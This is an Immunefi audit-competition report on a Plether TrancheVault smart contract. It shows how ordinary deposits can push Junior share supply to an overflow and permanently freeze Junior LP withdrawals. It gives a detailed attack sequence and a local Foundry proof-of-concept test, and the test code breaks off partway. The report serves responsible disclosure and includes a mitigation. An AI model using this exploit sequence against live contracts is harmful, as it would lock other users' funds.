# \#99911 [SC-Critical] Junior share-supply overflow makes a matured redemption head permanently freeze Junior LP funds

**Submitted on Nov 15th 2026 at 17:54:27 UTC by @legat for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99911
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Permanent freezing of funds

## Description

## Asset

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol

## Tested version and environment

```text
Repository: https://github.com/immunefi-team/audit-comp-plether
Commit:     a82d4fefb02768e5b3bddcc97dee371eee24fea8
Category:   Smart Contract
Execution:  Local Foundry test using the repository's production-topology perps fixture
Token:      USDG, 6 decimals
Compiler:   Solidity 0.8.35, optimizer 200, via-IR
```

The test runs the scoped production HousePool, both TrancheVaults, CfdEngine and redemption math sidecar. The repository fixture uses `MockSettlementToken` solely to provision each actor's USDG and `MockPyth` to hold an unchanged cached price. These are outside-scope test components; no in-scope accounting or settlement implementation is replaced or patched. The test uses the release 1-USDG seed positions, 800-bps annual Senior coupon, 40-million-USDG Senior cap, 80% Senior share cap, zero Junior maintenance fee, one-hour LP epochs, five-minute request cutoff, 0.01e18 VPI factor and 0.4e18 maximum skew ratio. No position is opened, so price feeds and VPI are not causal.

## Impact

Impact: Permanent freezing of funds

## Summary

Plether's Junior Vault can mint raw shares near the `uint256` limit through ordinary deposits after Senior coupon accrual has reduced Junior principal to a small positive amount. At raw supply `2^256 - 2`, both the Junior deposit quote and the Junior redemption pricing path add 1,000 virtual shares in checked arithmetic and panic. An attacker can place a funded Junior redemption request just after the cutoff for the epoch in which its final deposit lands. That redemption head matures one epoch later, so every LP settlement that reaches the Junior redemption phase panics **before** the Pool's pause and deposit-deferral checks. The head cannot be cancelled after maturity, and every new Junior redemption request also panics at its estimate. An independently funded Junior LP is left with valuable shares and no working exit.

The PoC proves this with an honest Junior LP who deposited 30 USDG. Its pre-landing redemption estimate is `29,999,992` atoms; a control branch actually settles and pays out `29,999,984` atoms. After the overflow landing, the LP retains a conservative value lower bound of `29,999,983` atoms but cannot request an exit. A separate attacker-funded 2-USDG Junior position supplies the timed redemption head. The test confirms the failure under `pause()`, after owner recapitalization and Senior assignment, and after an 827-year time warp. It also tests the Senior backlog exception: 16 of 17 hourly Senior redemption heads can be funded before the Junior phase, while the final Senior tail head remains blocked. The permanent impact claimed here is **Junior LP principal**, not an assertion that every Senior LP has no workaround.

## Finding Description

### Intended behavior

An accepted Junior deposit must either mint shares on epoch settlement or remain refundable. A funded Junior redemption request must either receive an asset payout or reach a refund path, and a third-party Junior LP must be able to request redemption of its own valuable shares. The bounded LP epoch phases are meant to progress even when one request cannot be priced. Senior coupon accrual and normal LP deposits and withdrawals are supported release flows; neither requires a privileged attacker.

### Actual behavior

The attacker deposits 2,007,000 USDG in Junior and 7,999,000 USDG in Senior. At the release 800-bps Senior coupon, about 3.0 years without sufficient offsetting Junior revenue reduces Junior principal to `100003455` atoms while it stays positive. The attacker then makes 59 hourly Junior top-ups, keeping principal positive while each mint receives many more shares per USDG. In the last top-up epoch, it redeems its Senior shares, leaving seed-scale Senior principal. A funded Junior redemption sets raw Junior supply to exactly `2^255 - 501`; an ordinary final Junior deposit equal to the following epoch's post-coupon Junior principal plus one atom mints the exact complementary shares. Raw supply becomes `2^256 - 2`.

**Escrow leg.** A separate user submits a 1,000-USDG Junior deposit after the final mint. `TrancheVault._requestDeposit` transfers the user's assets into escrow without quoting shares (`TrancheVault.sol:577-600`). On maturity, `HousePool._settleDepositPhase` calls `quoteDepositFromState` (`HousePool.sol:1030-1048`), whose `pricingSupply + VIRTUAL_SHARES` at `TrancheVault.sol:1409` panics before the zero-share rejection/refund branch. The user's matured cancellation fails under `TrancheVault.sol:848-860`. The test prints an 827-year projected-coupon self-cancel wait if no recovery action occurs and demonstrates that the user can eventually cancel after that wait. The recovery paths and timings are disclosed below; they do not remove the observed freeze before intervention.

**Permanent redemption-head leg.** A third party independently deposits 30 USDG into Junior; the attacker funds a separate, dust-sized Junior LP address with 2 USDG. Before the final mint, the test's control branch settles the third party's full redemption and pays `29,999,984` atoms. The attacker submits the final deposit before the next epoch cutoff, then the dust address submits a full redemption after that cutoff. The requests receive successive epoch IDs. The final deposit is settled while the dust redemption is still immature, so raw supply lands at `2^256 - 2` without the dust head being processed. One epoch later, the dust head matures. `HousePool._fundRedemptionPhase` calls `netAssetsForShares` at `HousePool.sol:957`; `HousePoolRedemptionMathLib.sol:46` evaluates `supply + 1000` and panics before the Pool can process a refund. The dust head is now too old to cancel (`TrancheVault.sol:895-896`). The honest LP's new `requestRedeem` calls `estimateRedeemAssets` and also panics (`TrancheVault.sol:1385-1388,1611-1617`). An ordinary share transfer succeeds at the release zero maintenance-fee APR (`TrancheVault.sol:314-333`), but the recipient's `requestRedeem` reaches the same overflowing estimate, so moving the shares does not restore an exit.

`pause()` returns before Junior deposit pricing but only **after** the Junior redemption phase (`HousePool.sol:878-912`); it cannot bypass this matured head. Owner recapitalization and `assignUnassignedAssets(true, ...)` increase Senior principal but do not clear the Junior head or lower Junior share supply. `pauseLpEpochSettlement()` stops clearing entirely. The test confirms the panic after each action and after an 827-year warp. A same-state control without the dust request allows an owner-funded Senior redemption under `pause()`. Senior LPs have a narrower escape: more than 16 separate matured Senior epoch heads make the Pool return at the Senior work limit before reaching Junior; the test funds 16 and shows the last tail head remains blocked. No analogous Junior bypass is available because the failing head is the first statement of its pricing loop.

CECuro MED-24, “LP can delay other redeemers with zero-payout refund epochs” (Acknowledged and listed open in `scope.txt:131`), has published locations `HousePool.sol:932-967` and `TrancheVault.sol:1483-1501`. Its accepted limitation says, “Zero-payout redemption epochs can consume settlement work and require additional calls before later epochs are funded.” Those heads reach the refund branch and later calls can progress. This head panics at `HousePoolRedemptionMathLib.sol:46` through `HousePool.sol:957` **before** `HousePool.sol:960-987` can refund it; additional calls repeat the panic. CECuro LOW-72, “Pending depositor can receive impossible share quotes for a wiped tranche” (Addressed), concerns an indicative quote under a projected **zero-principal** wipe. Its fix at `TrancheVault.sol:1366-1368` remains present; here Junior principal is positive (`82,868,039` atoms). Under the same-root test in `scope.txt:130`, neither disclosure covers this checked-arithmetic, matured-head failure. The root is independent of Junior maintenance fees: release APR is zero (`DEPLOYMENT.md:152`, asserted in the PoC), so this is not an inactive-feature issue under `scope.txt:148`.

### Recovery and operational limits

The owner has documented, legitimate recovery powers; the PoC and this report disclose them. At the escrow-leg end state, Junior principal is `82,868,039` atoms and Senior principal/high-water mark is `1,252,437` atoms. `CfdEngine.recapitalizePool` (`CfdEngine.sol:632-653`) followed by `HousePool.assignUnassignedAssets(true, ...)` (`HousePool.sol:660-703`) can increase Senior principal without quoting the overflowed Junior supply. Owner/pauser `pause()` (`HousePool.sol:388-390`) lets Senior redemptions settle before the stuck **deposit** quote. The test executes both the recapitalization and the paused Senior redemption. An owner can also propose a higher Senior coupon and share cap; `finalizePoolConfig` is not blocked by the overflow state, although a rate change needs a fresh mark (`HousePool.sol:306-376,1484`). The rate/share change has a 72-hour timelock.

| Escrow-leg recovery action | Earliest cancellation at the logged state |
| --- | ---: |
| No owner action; permissionless projected-coupon self-cancel | 26,082,414,503 seconds, about 827 years |
| Immediate owner recapitalization and Senior assignment at the release 80% share cap and 800-bps rate | 98,550,280 seconds, about 3.125 years; executed in the PoC |
| Above plus a 100% annual Senior rate after the 72-hour timelock | About 93.9 days total, derived from the quoted coupon formula |
| Above plus a 99.99% Senior share cap in the same timelocked proposal | About 72.9 hours total, requiring approximately 826,086 USDG of additional owner capital at the logged state |

The latter two figures are source-derived bounds printed by the test, not transactions that the test executes. The owner-funded recapitalization is real capital, not a privileged attacker step. `assignUnassignedAssets(false, ...)` would quote the Junior Vault and panic; the Senior assignment route is the operative one. None of these escrow recovery actions burns the matured **redemption** head or reduces the overflowed Junior share supply. The permanently frozen honest Junior principal in the second leg therefore remains the selected impact. A severe trader loss that wipes Junior principal might open the escrow-leg cancellation guard sooner, but the redemption-head quote still adds 1,000 to the raw supply and panics; the PoC shows that even the 827-year projected-wipe horizon does not clear it.

## Root Cause

`TrancheVault.quoteDepositFromState` and the ERC-4626 conversion paths use `supply + VIRTUAL_SHARES` without an enforced upper bound on mintable raw supply (`TrancheVault.sol:1400-1409,1853-1866`). Ordinary deposits can therefore land a raw supply at which this expression overflows. Separately, `HousePool._fundRedemptionPhase` invokes `HousePoolRedemptionMathLib.netAssetsForShares` before it can decide to refund a zero-value head (`HousePool.sol:957-987`); that math also computes `supply + virtualShares` in checked arithmetic (`HousePoolRedemptionMathLib.sol:34-46`). A matured head cannot be cancelled and has no separate permissionless skip or refund entrypoint, so the panic forms a persistent queue barrier.

## Impact Explanation

An honest Junior LP's own approximately 30 USDG of principal remains represented by shares but cannot be redeemed. Before the landing, its full-balance redemption estimates `29,999,992` atoms; the completed control redeems and pays `29,999,984` atoms, with Junior principal decreasing. After the landing, the PoC's conservative value lower bound is `29,999,983` atoms, but the same LP's redemption request panics. The attacker also traps its 2-USDG dust head and its remaining Junior shares. This is freezing of principal, not theft or a claim on unclaimed yield. The Junior queue cannot reach its refund/funding mutations because the checked addition panics first. Even if an owner recovers the separate 1,000-USDG deposit escrow, the matured redemption head and valuable Junior shares remain stuck. Senior redemptions can be made to progress through the 16-epoch backlog workaround; the last tail request remains blocked. Already claimable, previously finalized assets are not asserted to be frozen.

## Likelihood Explanation

The setup requires the attacker to provide about 10 million USDG of initial Senior and Junior capital, become effectively the sole non-seed Senior LP for the decisive withdrawal, and wait about 3.0 years with insufficient Junior revenue to offset the Senior coupon. The attacker then pays for 59 hourly top-ups and must coordinate the final deposit and dust redemption across the five-minute request cutoff and consecutive one-hour epochs. A permissionless LP settlement must land the final deposit in its assigned epoch; otherwise the dust head can mature and be funded before the unsafe mint. The attacker's final Junior deposit must be the only Junior entry maturing in that epoch to land the exact `2^256 - 2` supply; a competing entry can shift the cumulative quote, so the attacker must observe the queue and retry in a later epoch. These conditions make the sequence difficult, but every transaction in the PoC follows an in-scope public path at release parameters. The program calculates impact separately from feasibility and does not treat capital alone as a reason to change the impact (`scope.txt:158-162`).

The attacker does not need owner, pauser, guardian or sequencer authority, an incorrect parameter, a Pyth error, or an inactive feature. The honest Junior LP contributes its own 30 USDG in an ordinary deposit; its post-landing claim is measured in the PoC. The 1,000-USDG escrow leg has the recovery options stated above; those actions do not decide whether the arithmetic defect and permanent Junior-share freeze occur.

## Attack Path / Reproduction Path

1. With 1-USDG Senior and Junior seeds and the release 800-bps coupon and 40M/80% Senior limits, deposit 2,007,000 USDG in Junior and 7,999,000 USDG in Senior as the attacker. A same-amount 1,000-USDG third-party Junior deposit control activates normally before the attack.
2. Advance about 3.0 years with no offsetting Junior revenue, then settle. Keep Junior principal positive near 100 USDG. Perform 59 hourly Junior top-ups; redeem the attacker's Senior shares during the last top-up epoch.
3. For the escrow leg, redeem enough attacker Junior shares to leave `2^255 - 501` raw supply, then deposit post-coupon Junior principal plus one atom. Settle to land `2^256 - 2`. In a later epoch, accept a separate user's 1,000-USDG Junior deposit. Two settlement calls panic; its matured cancellation reverts. Recapitalize/assign Senior and show the resulting owner-funded recovery and paused Senior redemption, then show the 827-year permissionless self-cancel.
4. Restore the amplified state. Before the final burn, have an honest Junior LP deposit 30 USDG and an attacker dust address deposit 2 USDG. Burn only the attacker's shares to leave the same `2^255 - 501` raw supply, preserving both other LPs' shares and their funded value. From that same pre-final-mint state, first run and reverse a control where the honest LP redeems its full balance, receives `29,999,984` atoms, and Junior principal falls.
5. Before the cutoff, submit the final attacker Junior deposit for epoch `502479`. After that cutoff, submit the dust full redemption for epoch `502480`. Settle in `502479`: the dust head is not matured and the raw supply lands at `2^256 - 2`.
6. In `502480`, show the dust head is matured. Settlement panics at the Junior redemption quote. Dust cancellation reverts, and the honest LP's new redemption request panics. Repeat after `pause()`, owner recapitalization plus Senior assignment, and the dedicated LP settlement pause. Show that the failure persists after an 827-year warp.
7. Queue 17 separate hourly Senior redemption heads. One settlement funds 16 before reaching Junior; the final tail remains and the next settlement panics. Rewind to the same state without the dust request: after the overflow landing, `pause()` permits a Senior redemption to fund. This isolates the matured Junior head as the blocker.

## External Preconditions

- The active, in-scope Senior and Junior tranches operate with the release coupon, caps, seed values, and ordinary LP epoch rules.
- The attacker can fund the initial LP positions and hourly top-ups and be effectively the sole non-seed Senior LP at its withdrawal. The other Junior LP is independently funded.
- Junior receives insufficient offsetting revenue over the long setup period, or reaches a comparable small-positive-principal state through another legitimate sequence. The PoC uses the first path only.
- The attacker can submit ordinary requests around a public five-minute cutoff, and a permissionless LP keeper settles the final deposit in its designated epoch.

## Internal Preconditions

- Junior principal remains greater than zero during the final mint; a projected terminal wipe would defer new Junior activation.
- The final mint occurs while the dust redeem head is queued for the **following** epoch. The head is not matured at landing but is matured at the next LP settlement. The attacker's final deposit is the only Junior entry maturing in its epoch: `HousePool.sol:1043-1045` quotes the cumulative batch, so another entry would change the exact `A_final = P+1` landing. A co-landing honest deposit would also be frozen if the overflow still occurred, but the PoC's exact integer landing needs this exclusivity.
- The honest Junior LP has already activated its shares. Its pre-landing full redemption estimate is `29,999,992` atoms; the control completes and pays `29,999,984` atoms. It retains at least `29,999,983` atoms of conservative value at landing. The dust address has passed the deposit cooldown and submits a full redemption before the overflowed conversion is reached.
- Raw Junior supply remains `2^256 - 2` and the matured dust head remains unrefunded. Neither `pause()` nor Senior recapitalization lowers the supply or removes that head.

## Affected Code

- `packages/perps/src/TrancheVault.sol:545-555,577-600` assigns request epochs and escrows deposit assets before a quote.
- `packages/perps/src/TrancheVault.sol:895-896,1385-1409,1611-1617,1853-1866` blocks matured redeem cancellation and overflows in Junior share conversion and quoting.
- `packages/perps/src/HousePool.sol:824-935,957-987,1030-1048` processes Senior then Junior redemptions before pause/deposit checks and quotes deposits before the refund branch.
- `packages/perps/src/libraries/HousePoolRedemptionMathLib.sol:34-46` computes `supply + virtualShares` before the zero-payout refund decision.
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:47-86` moves Junior principal to Senior coupon while the Junior share supply persists.

## Recommended Mitigation

Enforce a conservative maximum on raw and accrued tranche share supply before any mint can make `supply + VIRTUAL_SHARES` unsafe in a deposit, redemption, or ERC-4626 conversion. Include the next request's full cumulative epoch mint in the bound. For an already accepted request whose quote cannot be represented, provide a bounded, permissionless way to reject/refund the request and advance the queue without first evaluating the failing arithmetic. Apply the same guarantee to matured redemption heads so a quote failure cannot block every later Junior exit. Verify that a Junior failure does not roll back otherwise fundable Senior work and that pause and recovery paths remain effective.

## Proof of Concept

**Description**

The single complete Foundry test below exercises the scoped production Pool, both Vaults, Engine, and redemption sidecar through ordinary asynchronous LP requests, cooldowns, one-hour epoch settlement, claims and redemption. It proves both the long-lived 1,000-USDG escrow leg and the stronger permanent Junior redemption-head leg. It asserts the same-amount ordinary deposit control, an honest LP's completed `29,999,984`-atom redemption control, exact raw supply `2^256 - 2`, the dust request's one-epoch-later maturity, the honest LP's remaining funded value, panic `0x11`, cancellation errors, the owner recovery, the paused Senior exit, the 17-head Senior bypass, and a same-state control without the dust head. Time is simulated with Foundry `vm.warp`; no public network is touched. The fixture mints test USDG to represent the actors' funded capital and uses no mock of an in-scope accounting component.

**Where to place files and their names**

Save the one complete authored source file below at the following path under the frozen repository root:

```text
packages/perps/test/perps/poc/JuniorVirtualOffsetOverflowE2E.t.sol
```

This is the only authored file added for the PoC; no scoped production source is modified. Source SHA-256: `04e5d15953fd7b47e9c22d027016e5a340e731cf79c677341e3d2ad07dc6910a`. Fresh log SHA-256: `c8e7d8d80f45adc777ca27ccc84e9b1a4d3f1e0df059521179e728ed0fcb7d37`.

**Clean clone and exact run command**

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git audit-comp-plether
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/perps/poc
# Save the complete authored Solidity source block below at packages/perps/test/perps/poc/JuniorVirtualOffsetOverflowE2E.t.sol
cd packages/perps
forge test --offline --match-path test/perps/poc/JuniorVirtualOffsetOverflowE2E.t.sol -vv
```

The sealed run used Forge 1.8.1 (`982849d3140c01fd3b72905759581a132df7aa98`) on macOS 27.2.1. The authored source and complete fresh passing log follow.

**Complete authored source**

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Release-parameter trace of the coupon/refill producer for Junior virtual-share overflow.
contract JuniorVirtualOffsetOverflowE2E is HousePoolAsyncTestBase {
    address internal constant ATTACKER = address(0xA11CE);
    address internal constant VICTIM = address(0xB0B);

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maxSkewRatio = 0.4e18;
    }

    function test_JuniorShareOverflowFreezesDepositsAndRedemptions() public {
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(pool.seniorRateBps(), 800);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(juniorVault.maintenanceFeeAprBps(), 0);

        _fundJunior(ATTACKER, 2_007_000e6);
        _fundSenior(ATTACKER, 7_999_000e6);
        uint256 ordinaryControlSnapshot = vm.snapshotState();
        uint256 ordinaryControlId = _requestAsyncDeposit(juniorVault, VICTIM, 1_000e6);
        _settleAsyncRequest(ordinaryControlId, false);
        uint256 ordinaryControlShares = _claimAsyncDeposit(juniorVault, ordinaryControlId, VICTIM);
        assertGt(ordinaryControlShares, 0, "the same 1000 USDG request normally activates");
        console2.log("ordinary 1000 USDG control shares", ordinaryControlShares);
        assertTrue(vm.revertToState(ordinaryControlSnapshot), "restore before attack setup");
        uint256 juniorBefore = pool.juniorPrincipal();
        uint256 seniorBefore = pool.seniorPrincipal();
        uint256 q = (seniorBefore + juniorBefore) * 800 * 3600 / (10_000 * 365 days);
        uint256 targetJunior = 100e6;
        uint256 elapsed = (juniorBefore - targetJunior) * 10_000 * 365 days / (seniorBefore * 800);
        uint256 targetTime = pool.lastSeniorCouponCheckpointTime() + elapsed;
        console2.log("initial J atoms", juniorBefore);
        console2.log("initial Sp atoms", seniorBefore);
        console2.log("next hourly coupon atoms", q);
        console2.log("target timestamp", targetTime);

        _finishAsyncCooldown(seniorVault, ATTACKER);
        uint256 seniorShares = seniorVault.convertToShares(2e6);
        _requestAsyncRedeem(seniorVault, ATTACKER, seniorShares);
        vm.warp(targetTime);
        _settleLpEpochForTest();
        console2.log("post-long J atoms", pool.juniorPrincipal());
        console2.log("post-long Sp atoms", pool.seniorPrincipal());
        console2.log("post-long raw Junior S", juniorVault.totalSupply());
        console2.log("next actual hourly coupon atoms", pool.seniorPrincipal() * 800 * 3600 / (10_000 * 365 days));
        assertGt(pool.juniorPrincipal(), 0, "coupon must leave positive Junior principal");

        uint256 targetSupply = Math.mulDiv(type(uint256).max, 6, 10);
        bool seniorExited;
        for (uint256 i; i < 120 && juniorVault.totalSupply() < targetSupply; ++i) {
            uint256 beforeSupply = juniorVault.totalSupply();
            uint256 beforePrincipal = pool.juniorPrincipal();
            uint256 beforeSenior = pool.seniorPrincipal();
            (uint256 epoch,) = juniorVault.getRequestEpochWindow();
            uint256 maturity = pool.lpEpochStart(epoch);
            uint256 due = beforeSenior * 800 * (maturity - pool.lastSeniorCouponCheckpointTime())
                / (10_000 * 365 days);
            assertGt(beforePrincipal, due, "coupon must not wipe Junior before activation");
            uint256 afterCoupon = beforePrincipal - due;
            uint256 amount = due;
            uint256 maxAmount = Math.mulDiv(targetSupply - beforeSupply, afterCoupon + 1, beforeSupply + 1000);
            bool capped = amount > maxAmount;
            if (capped) {
                amount = Math.mulDiv(targetSupply - beforeSupply, afterCoupon + 1, beforeSupply + 1000);
                _requestAsyncRedeem(seniorVault, ATTACKER, seniorVault.balanceOf(ATTACKER));
                seniorExited = true;
            }
            assertGe(amount, 1e6, "eligible one-dollar minimum deposit");
            uint256 requestId = _requestAsyncDeposit(juniorVault, ATTACKER, amount);
            assertEq(requestId, epoch);
            console2.log("settling cycle", i);
            console2.log("request epoch", requestId);
            console2.log("cycle pre J", beforePrincipal);
            console2.log("cycle projected due", due);
            _settleAsyncRequest(requestId, false);
            _claimAsyncDeposit(juniorVault, requestId, ATTACKER);
            if (i % 10 == 0 || capped) {
                console2.log("cycle", i);
                console2.log("cycle timestamp", block.timestamp);
                console2.log("cycle J atoms", pool.juniorPrincipal());
                console2.log("cycle raw Junior S", juniorVault.totalSupply());
            }
            if (capped) break;
        }
        assertTrue(seniorExited, "senior exits at capped amplification epoch");
        console2.log("post producer senior principal", pool.seniorPrincipal());
        console2.log("post producer junior principal", pool.juniorPrincipal());
        assertGe(juniorVault.totalSupply(), targetSupply - targetSupply / 1e6, "amplification reaches target supply");
        uint256 preBurnSnapshot = vm.snapshotState();

        uint256 halfMinus500 = type(uint256).max / 2 - 500;
        uint256 burnShares = juniorVault.totalSupply() - halfMinus500;
        _finishAsyncCooldown(juniorVault, ATTACKER);
        uint256 burnRequest = _requestAsyncRedeem(juniorVault, ATTACKER, burnShares);
        _settleAsyncRequest(burnRequest, false);
        console2.log("post burn raw Junior S", juniorVault.totalSupply());
        console2.log("post burn Junior P atoms", pool.juniorPrincipal());
        console2.log("post burn Senior Sp atoms", pool.seniorPrincipal());
        console2.log("post burn Senior HWM minus Sp atoms", pool.seniorHighWaterMark() - pool.seniorPrincipal());
        assertEq(juniorVault.totalSupply(), halfMinus500, "funded burn reaches half-minus-500");

        // A separate ordinary request still settles before the final overflow mint.
        uint256 controlSnapshot = vm.snapshotState();
        uint256 controlRequest = _requestAsyncDeposit(juniorVault, VICTIM, 1e6);
        _settleAsyncRequest(controlRequest, false);
        uint256 controlShares = _claimAsyncDeposit(juniorVault, controlRequest, VICTIM);
        assertGt(controlShares, 0, "control request must activate");
        console2.log("pre-overflow control shares", controlShares);
        assertTrue(vm.revertToState(controlSnapshot), "return to pre-control state");

        (uint256 finalEpoch,) = juniorVault.getRequestEpochWindow();
        uint256 finalMaturity = pool.lpEpochStart(finalEpoch);
        uint256 finalDue = pool.seniorPrincipal() * 800 * (finalMaturity - pool.lastSeniorCouponCheckpointTime())
            / (10_000 * 365 days);
        uint256 finalAmount = pool.juniorPrincipal() - finalDue + 1;
        uint256 finalQuotedShares = juniorVault.quoteDepositFromState(
            finalAmount, pool.juniorPrincipal() - finalDue, juniorVault.totalSupply(), 0
        );
        assertEq(finalQuotedShares, juniorVault.totalSupply() + 1000, "single-request final epoch quote");
        console2.log("final coupon atoms", finalDue);
        console2.log("final A atoms", finalAmount);
        uint256 finalRequest = _requestAsyncDeposit(juniorVault, ATTACKER, finalAmount);
        assertEq(finalRequest, finalEpoch);
        _settleAsyncRequest(finalRequest, false);
        _claimAsyncDeposit(juniorVault, finalRequest, ATTACKER);
        console2.log("post final raw Junior S", juniorVault.totalSupply());
        assertEq(juniorVault.totalSupply(), type(uint256).max - 1, "raw supply reaches overflow zone");

        uint256 victimAssets = 1_000e6;
        uint256 vaultBalanceBeforeVictim = settlementToken.balanceOf(address(juniorVault));
        uint256 victimRequest = _requestAsyncDeposit(juniorVault, VICTIM, victimAssets);
        assertGt(victimRequest, finalEpoch, "victim must enter a later epoch");
        assertEq(settlementToken.balanceOf(address(juniorVault)), vaultBalanceBeforeVictim + victimAssets, "victim assets escrowed");
        vm.warp(pool.lpEpochStart(victimRequest));
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        console2.log("two matured LP settlement panic assertions passed");
        vm.startPrank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(victimRequest);
        vm.stopPrank();
        console2.log("matured victim cancellation revert assertion passed");
        assertEq(settlementToken.balanceOf(address(juniorVault)), vaultBalanceBeforeVictim + victimAssets, "escrow remains frozen");
        console2.log("victim escrow atoms", victimAssets);
        console2.log("overflow raw supply", juniorVault.totalSupply());
        uint256 seniorHwm = pool.seniorHighWaterMark();
        assertEq(seniorHwm, pool.seniorPrincipal(), "no unrepaired Senior impairment");
        uint256 seniorCapacity = 4 * pool.juniorPrincipal() - seniorHwm - 1000;
        console2.log("post-overflow Junior P atoms", pool.juniorPrincipal());
        console2.log("post-overflow Senior Sp atoms", pool.seniorPrincipal());
        console2.log("post-overflow Senior HWM atoms", seniorHwm);
        console2.log("owner Senior assignment capacity atoms", seniorCapacity);

        uint256 ownerRecoverySnapshot = vm.snapshotState();
        settlementToken.mint(address(this), seniorCapacity);
        settlementToken.approve(address(engine), seniorCapacity);
        engine.recapitalizePool(seniorCapacity);
        pool.assignUnassignedAssets(true, address(this));
        uint256 recapSenior = pool.seniorPrincipal();
        assertLe(recapSenior, 4 * pool.juniorPrincipal(), "owner respects release Senior share cap");
        console2.log("owner-recapitalized Senior Sp atoms", recapSenior);
        uint256 ownerRecoverySeconds = Math.mulDiv(
            pool.juniorPrincipal(), 10_000 * 365 days, recapSenior * 800
        );
        console2.log("owner-recapitalized recovery seconds", ownerRecoverySeconds);
        uint256 couponDuringTimelock = Math.mulDiv(recapSenior * 800, 72 hours, 10_000 * 365 days);
        uint256 juniorAfterTimelock = pool.juniorPrincipal() - couponDuringTimelock;
        uint256 seniorAfterTimelock = recapSenior + couponDuringTimelock;
        uint256 rateOnlyRecoverySeconds = 72 hours + Math.mulDiv(juniorAfterTimelock, 365 days, seniorAfterTimelock);
        uint256 expandedSeniorLimit = juniorAfterTimelock * 9999;
        uint256 expandedOwnerCapital = expandedSeniorLimit - seniorAfterTimelock;
        uint256 expandedRecoverySeconds = 72 hours + Math.mulDiv(juniorAfterTimelock, 365 days, expandedSeniorLimit);
        console2.log("rate-only owner recovery seconds", rateOnlyRecoverySeconds);
        console2.log("expanded-share owner capital atoms", expandedOwnerCapital);
        console2.log("rate-plus-share owner recovery seconds", expandedRecoverySeconds);
        assertGt(expandedRecoverySeconds, 72 hours, "timelocked governance cannot rescue within 24h");
        uint256 ownerAssignedSnapshot = vm.snapshotState();
        vm.warp(block.timestamp + ownerRecoverySeconds + 1 hours);
        vm.prank(VICTIM);
        assertEq(juniorVault.cancelPendingDeposit(victimRequest), victimAssets, "owner-funded projected wipe refunds victim");
        console2.log("owner-funded victim refund atoms", victimAssets);
        assertTrue(vm.revertToState(ownerAssignedSnapshot), "restore owner-funded frozen state");

        _finishAsyncCooldown(seniorVault, address(this));
        pool.pause();
        uint256 seniorBeforePausedExit = pool.seniorPrincipal();
        uint256 seniorRedeemId = _requestAsyncRedeem(seniorVault, address(this), seniorVault.convertToShares(2e6));
        _settleAsyncRequest(seniorRedeemId, false);
        assertLt(pool.seniorPrincipal(), seniorBeforePausedExit, "paused mode still funds Senior redemption");
        console2.log("paused Senior redemption funded atoms", seniorBeforePausedExit - pool.seniorPrincipal());
        assertTrue(vm.revertToState(ownerRecoverySnapshot), "restore base frozen state");

        uint256 recoverySeconds = Math.mulDiv(
            pool.juniorPrincipal(), 10_000 * 365 days, pool.seniorPrincipal() * 800
        );
        console2.log("earliest projected-coupon recovery seconds", recoverySeconds);
        console2.log("recovery years", recoverySeconds / 365 days);
        vm.warp(block.timestamp + recoverySeconds + 1 hours);
        vm.prank(VICTIM);
        uint256 recovered = juniorVault.cancelPendingDeposit(victimRequest);
        assertEq(recovered, victimAssets, "view-based late self-cancel recovers escrow");
        console2.log("late cancel refunded atoms", recovered);
        assertTrue(vm.revertToState(preBurnSnapshot), "restore amplified state for matured-head variant");
        _proveMaturedJuniorRedeemHead();
    }

    function _proveMaturedJuniorRedeemHead() internal {
        address honestJunior = address(0xB05);
        address dustAttacker = address(0xD05);
        _fundJunior(honestJunior, 30e6);
        _fundJunior(dustAttacker, 2e6);

        uint256 targetRaw = type(uint256).max / 2 - 500;
        _finishAsyncCooldown(juniorVault, ATTACKER);
        uint256 burnShares = juniorVault.totalSupply() - targetRaw;
        uint256 burnId = _requestAsyncRedeem(juniorVault, ATTACKER, burnShares);
        _settleAsyncRequest(burnId, false);
        assertEq(juniorVault.totalSupply(), targetRaw, "dust and honest shares survive attacker burn");
        uint256 honestShares = juniorVault.balanceOf(honestJunior);
        uint256 honestValueBefore = juniorVault.estimateRedeemAssets(honestShares);
        assertGe(honestValueBefore, 25e6, "honest Junior LP retains material principal");
        console2.log("honest Junior pre-landing value atoms", honestValueBefore);

        // Control from the same valuable-share state, before the final mint is queued.
        uint256 honestExitSnapshot = vm.snapshotState();
        _finishAsyncCooldown(juniorVault, honestJunior);
        uint256 controlJuniorBefore = pool.juniorPrincipal();
        uint256 honestControlId = _requestAsyncRedeem(juniorVault, honestJunior, honestShares);
        _settleAsyncRequest(honestControlId, false);
        uint256 honestWalletBefore = settlementToken.balanceOf(honestJunior);
